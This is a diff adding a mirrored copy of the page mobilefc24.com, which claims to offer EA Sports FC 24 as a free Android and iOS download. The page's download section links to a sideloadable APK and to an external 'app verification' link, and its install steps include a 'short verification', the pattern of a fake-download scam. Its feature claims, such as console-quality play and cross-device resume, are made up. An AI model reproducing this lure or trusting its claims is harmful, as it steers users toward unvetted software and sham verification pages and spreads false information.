@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<!-- Mirrored from mobilefc24.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 14 Aug 2023 12:10:47 GMT -->
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FC 24 Mobile is Here! Get it on your Android or iOS!</title>
+    <meta
+      property="og:title"
+      content="Mobile FC 24 - Download FC 24 on your android or iOS"
+    />
+    <meta
+      property="og:description"
+      content="Explore the world of EA FC 24 on your mobile. You can download the APK file on your Android or directly on iOS devices. Play FC 24 wherever you go on your phone."
+    />
+    <meta property="og:image" content="assets/img/mobile-fc-24-cover.jpg" />
+
+    <link rel=“canonical” href=%c3%a2%c2%80%c2%9chttps_/mobilefc24.html />
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@400;600&amp;family=Roboto:wght@400;500;700&amp;family=Tektur:wght@600;700&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined"
+      rel="stylesheet"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="assets/img/apple-touch-icon.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="assets/img/favicon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="assets/img/favicon-16x16.png"
+    />
+    <link rel="stylesheet" href="css/general.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/queries.css" />
+  </head>
+  <body>
+    <header>
+      <div class="header">
+        <nav class="main-nav">
+          <a href="#"
+            ><img
+              class="logo"
+              src="assets/img/fc-24-mobile-logo.png"
+              alt="FC 24 Mobile"
+          /></a>
+          <ul class="main-nav-list">
+            <li>
+              <a class="main-nav-link nav-link--active link-navigation" href="index.html"
+                >Home</a
+              >
+            </li>
+            <li>
+              <a class="main-nav-link link-navigation" href="#tutorial"
+                >Tutorial</a
+              >
+            </li>
+            <li>
+              <a class="main-nav-link link-navigation" href="#features"
+                >Features</a
+              >
+            </li>
+            <li>
+              <a class="main-nav-link link-navigation" href="#gameplay"
+                >Gameplay</a
+              >
+            </li>
+               <li>
+              <a class="main-nav-link link-navigation" href="blog/index.html"
+                >Blog</a
+              >
+            </li>
+          </ul>
+        </nav>
+
+        <button onclick="navToggle()" class="btn-mobile-nav">
+          <span class="icon-mobile-menu material-icons-outlined md-48">
+            menu
+          </span>
+          <img
+            class="fc24-mobile-mini-logo"
+            src="fc24-logo-nav.svg"
+            alt="FC 24 Mobile Logo"
+          />
+          <span class="icon-mobile-close material-icons-outlined md-48">
+            close
+          </span>
+        </button>
+        <a class="main-nav-download-btn" href="#download">Download</a>
+      </div>
+
+      <section class="billboard">
+        <video
+          class="billboard-video"
+          src="assets/fc24-mobile-background.mp4"
+          muted
+          loop
+          autoplay
+          playsinline
+        ></video>
+        <div class="banner-text">
+          <div class="banner-title">
+            WELCOME TO
+            <span class="magic">
+              <span class="magic-text">FC24 MOBILE</span>
+            </span>
+          </div>
+          <div class="banner-content">
+            EA Sports FC 24 Mobile is here. You can now play the same FC 24 on
+            your android or iPhones.
+          </div>
+        </div>
+      </section>
+    </header>
+    <main>
+      <section id="tutorial" class="how-to-video">
+        <div class="how-to-full-width">
+          <div class="section-wrapper how-to-content">
+            <h2 class="section-title how-to-title padding--bot-md">
+              How to download FC 24 Mobile App
+            </h2>
+
+            <div class="custom-video-section">
+              <video controls>
+                <source
+                  src="assets/video/FC-24-Tutorial.mp4"
+                  type="video/mp4"
+                />
+                Your browser does not support HTML video.
+              </video>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-wrapper how-to-description">
+          <div class="description-grid">
+            <div class="grid-item guide-description">
+              <p>
+                Here's a detailed guide on how to download and install FC 24 on
+                your
+                <a href="https://www.android.com/" target="_blank">Android</a>
+                or
+                <a href="https://www.apple.com/ios/ios-16/" target="_blank"
+                  >iOS</a
+                >
+                devices:
+              </p>
+              <ol>
+                <li>Go to the download section.</li>
+                <li>Tap on the download button.</li>
+                <li>
+                  Select your device, if it's iPhone, select iOS (Jump to step
+                  6). If it's Android, select Android.
+                </li>
+                <li>
+                  For Android phones, APK (No OBB required) file will be
+                  downloaded.
+                </li>
+                <li>Install the APK file and open it.</li>
+                <li>You will have to complete the short verification.</li>
+                <li>Game will be successfully installed on your phone.</li>
+              </ol>
+              <p>
+                Note: Make sure your device is running iOS 12 or higher. For
+                Android devices, make sure you are running 5.0 or above. The
+                game perfectly works on Samsung, Google Pixel, OnePlus, Vivo,
+                Oppo, Motorola, Asus, and more.
+              </p>
+            </div>
+            <div class="grid-item guide-img">
+              <img
+                src="assets/img/FC-24-on-iPhone.png"
+                alt="FC 24 on iPhone"
+              />
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="features" class="features-section">
+        <div class="section-wrapper padding--top-lg">
+          <h2 class="section-title feature-title">Features</h2>
+          <div class="feature-content">
+            <div class="feature-image">
+              <img
+                src="assets/img/fc-24-features.jpg"
+                alt="FC 24 Mobile features"
+              />
+            </div>
+            <div class="feature-description">
+              <p>
+                <strong>FC 24 Mobile</strong> lets you have the true football
+                experience on your phone or tablet. We have now introduced
+                centralized gaming where you can switch between consoles and
+                play.
+              </p>
+              <p>
+                For example, you can play on your
+                <a href="https://www.playstation.com/en-us/" target="_blank"
+                  >Playstation</a
+                >
+                or
+                <a href="https://www.xbox.com/en-US/" target="_blank">Xbox</a>
+                and pause the game and resume it from your phone. This allows
+                you to have high graphics experience anywhere you go.
+              </p>
+              <p>
+                We have also added new motion capture technology to capture
+                player movements perfectly. Professional players like Lionel
+                Messi, Mbappe, Neymar, and many more helped us capture their
+                movement. The game feels more realistic than ever.
+              </p>
+              <p>
+                <a href="https://www.ea.com/sports" target="_blank"
+                  >EA Sports</a
+                >
+                license with FIFA expired so the name has been changed to EA FC.
+                This makes our company free from FIFA rules and regulations.
+              </p>
+
+              <p>
+                We have also added Erling Haaland for the cover of Mobile FC 24
+                and he has the potential to be a long-term cover athlete for EA
+                Sports FC.
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="gameplay" class="gameplay-section">
+        <div class="section-wrapper padding--top-lg">
+          <h2 class="section-title">Gameplay</h2>
+          <div class="card-section-background">
+            <div class="card gameplay-cover">
+              <div class="card-front">
+                <img src="assets/img/fc-24-cover.png" alt="FC 24 Cover" />
+              </div>
+            </div>
+          </div>
+          <div class="gameplay-description">
+            <p>
+              We are excited to announce that we have decided to use Hypermotion
+              V on all Android and iOS devices too. Now you can enjoy the
+              life-like experience on your phone.
+            </p>
+            <p>
+              We placed arrays of cameras around the stadium to recreate the
+              exact motions witnessed in world-class competitions. Imagine
+              reliving iconic moments like Holland's goal against Dortmund in
+              the
+              <a
+                href="https://www.uefa.com/uefachampionsleague/"
+                target="_blank"
+                >Champions League</a
+              >.
+            </p>
+            <p>
+              With FC 24 on Android or iPhones, You can unlock a library of over
+              1200 unique running styles. All the running styles are crafted
+              from volumetric data of real players in the real field. It means
+              every player has their distinct movement making everything
+              authentic and truly immersive.
+            </p>
+            <p>
+              We have also partnered with
+              <a href="https://www.statsperform.com/opta/" target="_blank"
+                >Opta</a
+              >
+              to gather real-world data for each player. They provide us with
+              the data for each player, and how well they pass and shoot. This
+              allows players like Sam Kerr to have instinctive finishing or
+              Neymar's signature dribbling skills.
+            </p>
+            <p>
+              FC 24 Mobile has raised the bar for any football games on mobile.
+              So gear up, get your phone ready and download the game.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <section id="download" class="download-section">
+        <div class="section-wrapper padding--top-lg">
+          <h2 class="section-title download-title">Download</h2>
+          <div class="download-android-ios">
+            <video
+              src="assets/video/fc-24-gameplay-iphone.mp4"
+              class="gameplay-video"
+              loop
+              muted
+              autoplay
+              playsinline
+            ></video>
+            <div class="download-box">
+              <div class="download-text">Experience FC 24 Mobile Now!</div>
+              <div class="fc-24-mobile-icon">
+                <img
+                  src="assets/img/fc-24-ios-android.png"
+                  alt="FC 24 Android/iOS icon"
+                />
+              </div>
+              <div class="device-platforms">
+                <a href="FC%2024.apk">
+                  <div
+                    id="androidPlatform"
+                    class="platform android-btn btn-download"
+                  >
+                    <img
+                      src="assets/img/android-logo.png"
+                      alt="Android Logo"
+                    />
+                    Android
+                  </div>
+                </a>
+                <a
+                  href="https://appverification.net/cl/i/e6598l"
+                  rel="nofollow"
+                >
+                  <div id="iosPlatform" class="platform ios-btn btn-download">
+                    <img src="assets/img/ios-logo.png" alt="iOS Logo" />
+                    iOS
+                  </div>
+                </a>
+              </div>
+              <div
+                id="downloadButton"
+                class="btn-download"
+                onclick="showPlatforms()"
+              >
+                Download
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <footer>
+        <div class="section-wrapper footer-section">
+          <div class="footer-links">
+            <ul>
+              <li><a href="policy.html">Policy</a></li>
+              <li><a href="terms.html">Terms</a></li>
+              <li><a href="contact.html">Contact</a></li>
+            </ul>
+          </div>
+          <div class="footer-copyright">
+            © 2023 MOBILE FC 24 - All Rights Reserved
+          </div>
+        </div>
+      </footer>
+    </main>
+  </body>
+  <script src="js/script.js"></script>
+
+<!-- Mirrored from mobilefc24.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 14 Aug 2023 12:11:34 GMT -->
+</html>
